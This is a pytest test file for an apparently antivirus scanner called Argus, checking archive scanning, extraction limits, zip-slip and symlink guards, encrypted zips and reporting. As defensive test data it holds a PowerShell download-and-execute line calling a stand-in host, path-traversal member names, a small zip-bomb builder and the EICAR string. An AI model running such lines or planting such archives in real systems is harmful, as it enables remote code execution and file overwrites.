"""B-3 Phase 2 — archive scanning.

Archives are scanned through the SAME engine path as loose files
(``scan_file`` / ``scan_path`` / the headless CLI): members are
extracted to generated flat names inside one dedicated temp root,
never to a path derived from the member name, under shared hard
budgets (members / total extracted bytes / nesting depth /
per-member timeout). Any part Argus could not check makes the
archive "not fully scanned" — a visible state on the result, in
the statistics, and in the CLI output — never a silent clean pass.
"""

import binascii
import io
import json
import os
import stat
import struct
import tarfile
import tempfile
import zipfile
from pathlib import Path

import pytest

import argus.scanner as scanner
from argus.cli import EXIT_CLEAN, EXIT_DETECTIONS, main as cli_main
from argus.config import Exclusions
from argus.detections import Verdict
from argus.gui.format import scan_result_row
from argus.rules import BUILTIN_RULES
from argus.scanner import scan_file, scan_path
from argus.signatures import SignatureDB, init_db

EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


@pytest.fixture()
def db(tmp_path):
    path = tmp_path / "sigs.sigdb"
    init_db(path)
    with SignatureDB.open(path) as handle:
        yield handle


def _set_limit(monkeypatch, name, value):
    # raising=False so this file also runs (and fails on behaviour)
    # against the pre-change tree, where the constants do not exist.
    monkeypatch.setattr(scanner, name, value, raising=False)


def _make_zip(path: Path, members: dict[str, bytes], compression=zipfile.ZIP_DEFLATED):
    with zipfile.ZipFile(path, "w", compression=compression) as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return path


def _archive_temp_dirs() -> set[str]:
    return {
        p.name
        for p in Path(tempfile.gettempdir()).glob("argus-archive-*")
    }


def _notes(scanned) -> str:
    return "\n".join(scanned.assessment.notes)


# ----------------------------------------------------------------------
# Core detection through the engine
# ----------------------------------------------------------------------
def test_eicar_member_in_zip_flagged_through_scan_file(tmp_path, db):
    archive = _make_zip(
        tmp_path / "archive.zip",
        {"inner/eicar.com": EICAR, "notes.txt": b"ordinary"},
    )
    scanned = scan_file(archive, db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    det = scanned.assessment.detections[0]
    assert det.name == "EICAR-Test-File"
    # Member attribution in the reason, in the spec's shape.
    assert "archive.zip → inner/eicar.com" in det.reason
    assert scanned.archive_not_fully_scanned is False


def test_eicar_member_in_zip_flagged_through_scan_path(tmp_path, db):
    _make_zip(tmp_path / "archive.zip", {"eicar.com": EICAR})
    report = scan_path(tmp_path, db, BUILTIN_RULES)
    assert report.verdict is Verdict.MALICIOUS
    assert len(report.detections) == 1
    assert report.stats.archives_seen == 1
    assert report.stats.archives_not_fully_scanned == 0
    assert report.stats.archive_members_scanned == 1


def test_rule_hit_member_in_zip_flagged(tmp_path, db):
    _make_zip(
        tmp_path / "scripts.zip",
        {"dropper.ps1": b"powershell -c \"IEX (New-Object Net.WebClient)"
         b".DownloadString('http://bad.example/x')\""},
    )
    report = scan_path(tmp_path, db, BUILTIN_RULES)
    names = [d.name for f in report.detections for d in f.assessment.detections]
    assert "Suspicious_PowerShell_Download" in names


def test_clean_zip_is_clean_and_fully_scanned(tmp_path, db):
    _make_zip(tmp_path / "clean.zip", {"hello.txt": b"hello there"})
    scanned = scan_file(tmp_path / "clean.zip", db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.CLEAN
    assert scanned.archive_not_fully_scanned is False
    assert scanned.archive_members_scanned == 1


def test_empty_zip_is_clean(tmp_path, db):
    with zipfile.ZipFile(tmp_path / "empty.zip", "w"):
        pass
    scanned = scan_file(tmp_path / "empty.zip", db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.CLEAN
    assert scanned.archive_not_fully_scanned is False


def test_nested_zip_in_zip_detection(tmp_path, db):
    inner_buf = io.BytesIO()
    with zipfile.ZipFile(inner_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("eicar.com", EICAR)
    _make_zip(tmp_path / "outer.zip", {"inner.zip": inner_buf.getvalue()})
    scanned = scan_file(tmp_path / "outer.zip", db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    det = scanned.assessment.detections[0]
    assert "outer.zip → inner.zip → eicar.com" in det.reason


# ----------------------------------------------------------------------
# Hard limits — "not fully scanned", never clean
# ----------------------------------------------------------------------
def test_zip_bomb_stopped_by_byte_budget(tmp_path, db, monkeypatch):
    _set_limit(monkeypatch, "MAX_ARCHIVE_TOTAL_BYTES", 100_000)
    bomb = tmp_path / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("zeros.bin", b"\x00" * 5_000_000)
    assert bomb.stat().st_size < 20_000  # tiny on disk, huge extracted
    scanned = scan_file(bomb, db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is True
    assert scanned.assessment.not_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert "not fully scanned" in _notes(scanned)


def test_member_count_limit_hit_is_not_fully_scanned(tmp_path, db, monkeypatch):
    _set_limit(monkeypatch, "MAX_ARCHIVE_MEMBERS", 3)
    members = {f"f{i}.txt": b"x" for i in range(6)}
    _make_zip(tmp_path / "many.zip", members)
    scanned = scan_file(tmp_path / "many.zip", db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert "not fully scanned" in _notes(scanned)


def test_depth_limit_hit_is_not_fully_scanned(tmp_path, db):
    # Four levels of nesting; the depth limit is 3, and the EICAR
    # payload sits in the fourth — it must NOT be reached, and the
    # archive must say so instead of passing.
    payload = EICAR
    name = "eicar.com"
    for level in range(4):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(name, payload)
        payload = buf.getvalue()
        name = f"level{4 - level}.zip"
    archive = tmp_path / "deep.zip"
    archive.write_bytes(payload)
    scanned = scan_file(archive, db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert scanned.assessment.detections == []
    assert "not fully scanned" in _notes(scanned)


def test_per_member_timeout_is_not_fully_scanned(tmp_path, db, monkeypatch):
    # A negative budget means the deadline is already blown when the
    # first chunk is read — the cooperative check must trip.
    _set_limit(monkeypatch, "ARCHIVE_MEMBER_TIMEOUT_SECONDS", -1.0)
    _make_zip(tmp_path / "slow.zip", {"big.txt": b"A" * 100_000})
    scanned = scan_file(tmp_path / "slow.zip", db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert "not fully scanned" in _notes(scanned)


def test_limits_are_named_constants_with_sane_defaults():
    assert scanner.MAX_ARCHIVE_MEMBERS >= 100
    assert scanner.MAX_ARCHIVE_TOTAL_BYTES >= 16 * 1024 * 1024
    assert scanner.MAX_ARCHIVE_DEPTH >= 2
    assert scanner.ARCHIVE_MEMBER_TIMEOUT_SECONDS > 0


# ----------------------------------------------------------------------
# Guards: slip, links, corruption, encryption
# ----------------------------------------------------------------------
def test_slip_member_names_never_write_outside_temp_root(tmp_path, db):
    before = _archive_temp_dirs()
    tree = tmp_path / "tree"
    tree.mkdir()
    archive = _make_zip(
        tree / "slip.zip",
        {
            "../../evil_eicar.com": EICAR,
            "/abs_evil.txt": b"absolute path member",
            "..\\..\\win_evil.txt": b"backslash member",
        },
    )
    scanned = scan_file(archive, db, BUILTIN_RULES)
    # The EICAR member is still DETECTED — from its bytes, in temp —
    assert scanned.verdict is Verdict.MALICIOUS
    # …and nothing landed anywhere the member names pointed.
    assert not (tmp_path / "evil_eicar.com").exists()
    assert not (tmp_path.parent / "evil_eicar.com").exists()
    assert not Path("/abs_evil.txt").exists()
    assert not (tree / "win_evil.txt").exists()
    assert _archive_temp_dirs() == before


def test_symlink_member_not_followed(tmp_path, db):
    archive = tmp_path / "links.zip"
    target = tmp_path / "target.txt"
    target.write_bytes(EICAR)
    with zipfile.ZipFile(archive, "w") as zf:
        info = zipfile.ZipInfo("link_to_target")
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        info.create_system = 3
        zf.writestr(info, str(target).encode())
        zf.writestr("clean.txt", b"hello")
    scanned = scan_file(archive, db, BUILTIN_RULES)
    # The link's target bytes were never pulled in as a detection…
    assert scanned.assessment.detections == []
    # …and the unscanned link makes the archive not fully scanned.
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED


def test_corrupt_zip_is_not_fully_scanned_no_crash(tmp_path, db):
    bad = tmp_path / "bad.zip"
    bad.write_bytes(b"PK\x03\x04" + b"\xff" * 200)
    scanned = scan_file(bad, db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert "not fully scanned" in _notes(scanned)


# --- encrypted zip fixture: real ZipCrypto, built byte by byte -----
_CRC_TABLE = []
for _i in range(256):
    _c = _i
    for _ in range(8):
        _c = (_c >> 1) ^ 0xEDB88320 if (_c & 1) else (_c >> 1)
    _CRC_TABLE.append(_c)


def _crc_update(crc, byte):
    return _CRC_TABLE[(crc ^ byte) & 0xFF] ^ (crc >> 8)


def _zipcrypto_encrypt(data: bytes, password: bytes, crc: int) -> bytes:
    keys = [0x12345678, 0x23456789, 0x34567890]

    def update(c):
        keys[0] = _crc_update(keys[0], c)
        keys[1] = (keys[1] + (keys[0] & 0xFF)) & 0xFFFFFFFF
        keys[1] = (keys[1] * 134775813 + 1) & 0xFFFFFFFF
        keys[2] = _crc_update(keys[2], (keys[1] >> 24) & 0xFF)

    for b in password:
        update(b)
    out = bytearray()
    header = bytes(range(1, 12)) + bytes([(crc >> 24) & 0xFF])
    for plain in header + data:
        temp = (keys[2] | 2) & 0xFFFFFFFF
        out.append(plain ^ (((temp * (temp ^ 1)) >> 8) & 0xFF))
        update(plain)
    return bytes(out)


def _encrypted_zip_bytes(name: str, data: bytes, password: bytes) -> bytes:
    crc = binascii.crc32(data) & 0xFFFFFFFF
    enc = _zipcrypto_encrypt(data, password, crc)
    nb = name.encode()
    local = struct.pack(
        "<IHHHHHIIIHH", 0x04034B50, 20, 1, 0, 0, 0,
        crc, len(enc), len(data), len(nb), 0,
    ) + nb + enc
    central = struct.pack(
        "<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 1, 0, 0, 0,
        crc, len(enc), len(data), len(nb), 0, 0, 0, 0, 0, 0,
    ) + nb
    eocd = struct.pack(
        "<IHHHHIIH", 0x06054B50, 0, 0, 1, 1, len(central), len(local), 0
    )
    return local + central + eocd


def test_encrypted_member_is_not_fully_scanned(tmp_path, db):
    blob = _encrypted_zip_bytes("secret.txt", EICAR, b"pw123")
    # The fixture is a genuine encrypted zip: stdlib reads it WITH
    # the password and refuses without one.
    probe = tmp_path / "probe.zip"
    probe.write_bytes(blob)
    with zipfile.ZipFile(probe) as zf:
        assert zf.read("secret.txt", pwd=b"pw123") == EICAR
    archive = tmp_path / "encrypted.zip"
    archive.write_bytes(blob)
    scanned = scan_file(archive, db, BUILTIN_RULES)
    # Argus has no password: the member is unscanned, the archive is
    # not fully scanned, and the hidden EICAR is NOT waved through.
    assert scanned.assessment.detections == []
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED
    assert "not fully scanned" in _notes(scanned)


# ----------------------------------------------------------------------
# Temp hygiene
# ----------------------------------------------------------------------
def test_temp_root_gone_after_detection_and_after_bomb(tmp_path, db, monkeypatch):
    before = _archive_temp_dirs()
    _make_zip(tmp_path / "a.zip", {"eicar.com": EICAR})
    scan_file(tmp_path / "a.zip", db, BUILTIN_RULES)
    assert _archive_temp_dirs() == before
    _set_limit(monkeypatch, "MAX_ARCHIVE_TOTAL_BYTES", 10_000)
    _make_zip(tmp_path / "b.zip", {"big.bin": b"A" * 500_000})
    scan_file(tmp_path / "b.zip", db, BUILTIN_RULES)
    assert _archive_temp_dirs() == before


# ----------------------------------------------------------------------
# TAR (same abstraction, same guards)
# ----------------------------------------------------------------------
def _make_tar(path: Path, members: dict[str, bytes], mode="w"):
    with tarfile.open(path, mode) as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return path


def test_eicar_member_in_tar_and_tar_gz(tmp_path, db):
    _make_tar(tmp_path / "plain.tar", {"eicar.com": EICAR})
    scanned = scan_file(tmp_path / "plain.tar", db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS
    assert "plain.tar → eicar.com" in scanned.assessment.detections[0].reason

    _make_tar(tmp_path / "packed.tar.gz", {"eicar.com": EICAR}, mode="w:gz")
    scanned = scan_file(tmp_path / "packed.tar.gz", db, BUILTIN_RULES)
    assert scanned.verdict is Verdict.MALICIOUS


def test_plain_gzip_file_is_not_an_archive(tmp_path, db):
    import gzip

    plain = tmp_path / "notes.txt.gz"
    with gzip.open(plain, "wb") as fh:
        fh.write(b"just a compressed text file")
    scanned = scan_file(plain, db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is False
    assert scanned.verdict is Verdict.CLEAN


def test_tar_symlink_member_not_followed(tmp_path, db):
    archive = tmp_path / "links.tar"
    with tarfile.open(archive, "w") as tf:
        link = tarfile.TarInfo("sneaky_link")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        tf.addfile(link)
        data = b"hello"
        info = tarfile.TarInfo("clean.txt")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    scanned = scan_file(archive, db, BUILTIN_RULES)
    assert scanned.archive_not_fully_scanned is True
    assert scanned.verdict is Verdict.NOT_SCANNED


# ----------------------------------------------------------------------
# Exclusions still win — before any read
# ----------------------------------------------------------------------
def test_excluded_archive_is_left_alone(tmp_path, db):
    archive = _make_zip(tmp_path / "skip.zip", {"eicar.com": EICAR})
    before_bytes = archive.read_bytes()
    exclusions = Exclusions(paths=(str(archive),))
    scanned = scan_file(archive, db, BUILTIN_RULES, exclusions=exclusions)
    assert scanned.excluded is True
    assert scanned.assessment.detections == []
    assert scanned.archive_not_fully_scanned is False
    assert archive.read_bytes() == before_bytes


# ----------------------------------------------------------------------
# Reporting surfaces: stats, GUI row, CLI human + JSON, headless entry
# ----------------------------------------------------------------------
def test_gui_row_carries_not_fully_scanned(tmp_path, db):
    bad = tmp_path / "bad.zip"
    bad.write_bytes(b"PK\x03\x04" + b"\xff" * 64)
    scanned = scan_file(bad, db, BUILTIN_RULES)
    row = scan_result_row(scanned)
    assert row["verdict"] == "NotScanned"
    assert row["archive_not_fully_scanned"] is True
    assert any("not fully scanned" in r for r in row["reasons"])


def test_cli_scan_of_folder_flags_eicar_zip(tmp_path, capsys):
    tree = tmp_path / "tree"
    tree.mkdir()
    _make_zip(tree / "archive.zip", {"eicar.com": EICAR})
    db_path = tmp_path / "sigs.sigdb"
    assert cli_main(["sigdb", "init", str(db_path)]) == EXIT_CLEAN
    capsys.readouterr()
    assert cli_main(["scan", str(tree), "--db", str(db_path)]) == EXIT_DETECTIONS
    out = capsys.readouterr().out
    assert "EICAR-Test-File" in out
    assert "archive.zip → eicar.com" in out


def test_cli_json_carries_archive_state(tmp_path, capsys, monkeypatch):
    _set_limit(monkeypatch, "MAX_ARCHIVE_MEMBERS", 2)
    tree = tmp_path / "tree"
    tree.mkdir()
    _make_zip(tree / "many.zip", {f"f{i}.txt": b"x" for i in range(5)})
    db_path = tmp_path / "sigs.sigdb"
    assert cli_main(["sigdb", "init", str(db_path)]) == EXIT_CLEAN
    capsys.readouterr()
    code = cli_main(["scan", str(tree), "--db", str(db_path), "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert code != EXIT_CLEAN  # a partial archive is never a clean scan
    assert payload["stats"]["archives_not_fully_scanned"] == 1
    entry = next(f for f in payload["files"] if f["path"].endswith("many.zip"))
    assert entry["archive_not_fully_scanned"] is True
    assert entry["verdict"] == "NotScanned"
    assert any("not fully scanned" in n for n in entry["notes"])


def test_cli_human_output_names_not_fully_scanned(tmp_path, capsys):
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "bad.zip").write_bytes(b"PK\x03\x04" + b"\xff" * 64)
    db_path = tmp_path / "sigs.sigdb"
    assert cli_main(["sigdb", "init", str(db_path)]) == EXIT_CLEAN
    capsys.readouterr()
    code = cli_main(["scan", str(tree), "--db", str(db_path)])
    out = capsys.readouterr().out
    assert code != EXIT_CLEAN
    assert "not fully scanned" in out.lower()
    assert "Everything scanned came back clean" not in out


def test_headless_entry_scan_flags_eicar_zip(tmp_path, monkeypatch, capsys):
    from argus.entry import main as entry_main

    monkeypatch.setenv("ARGUS_DATA_DIR", str(tmp_path / "data"))
    tree = tmp_path / "tree"
    tree.mkdir()
    _make_zip(tree / "archive.zip", {"eicar.com": EICAR})
    assert entry_main(["scan", str(tree)]) == EXIT_DETECTIONS
    out = capsys.readouterr().out
    assert "EICAR-Test-File" in out


def test_history_db_from_before_archive_scanning_still_opens(tmp_path):
    """A history file written by an older Argus (scans table without
    the not-fully-scanned column) opens, migrates, and reports 0."""
    import sqlite3

    from argus.reporting import History

    legacy = tmp_path / "legacy.db"
    conn = sqlite3.connect(legacy)
    conn.executescript(
        """
        CREATE TABLE scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            kind TEXT NOT NULL, root TEXT,
            started_at TEXT NOT NULL, finished_at TEXT NOT NULL,
            files_scanned INTEGER NOT NULL DEFAULT 0,
            files_skipped INTEGER NOT NULL DEFAULT 0,
            files_excluded INTEGER NOT NULL DEFAULT 0,
            bytes_scanned INTEGER NOT NULL DEFAULT 0,
            detections_count INTEGER NOT NULL DEFAULT 0
        );
        CREATE TABLE detections (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scan_id INTEGER NOT NULL REFERENCES scans(id),
            recorded_at TEXT NOT NULL, path TEXT NOT NULL,
            verdict TEXT, severity TEXT,
            score INTEGER NOT NULL DEFAULT 0, name TEXT,
            reasons TEXT NOT NULL DEFAULT '[]', sha256 TEXT,
            action_taken TEXT NOT NULL DEFAULT 'none'
        );
        """
    )
    conn.commit()
    conn.close()
    with History.open(legacy) as history:
        history.record_scan(kind="ondemand", root="x", files_scanned=3)
        summary = history.summary(days=1)
        recent = history.recent_scans(limit=1)
    assert summary["files_not_fully_scanned"] == 0
    assert recent[0].files_not_fully_scanned == 0


def test_history_record_counts_not_fully_scanned(tmp_path, db):
    from argus.reporting import History

    _make_zip(tmp_path / "bad.zip", {"x.txt": b"hi"})
    (tmp_path / "bad.zip").write_bytes(b"PK\x03\x04" + b"\xff" * 32)
    report = scan_path(tmp_path / "bad.zip", db, BUILTIN_RULES)
    hist_path = tmp_path / "history.db"
    with History.open(hist_path) as history:
        history.record_scan(
            kind="ondemand",
            root=str(tmp_path),
            files_scanned=report.stats.files_scanned,
            files_skipped=report.stats.files_skipped,
            files_excluded=report.stats.files_excluded,
            bytes_scanned=report.stats.bytes_scanned,
            files_not_fully_scanned=report.stats.archives_not_fully_scanned,
        )
        summary = history.summary(days=1)
    assert summary["files_not_fully_scanned"] == 1
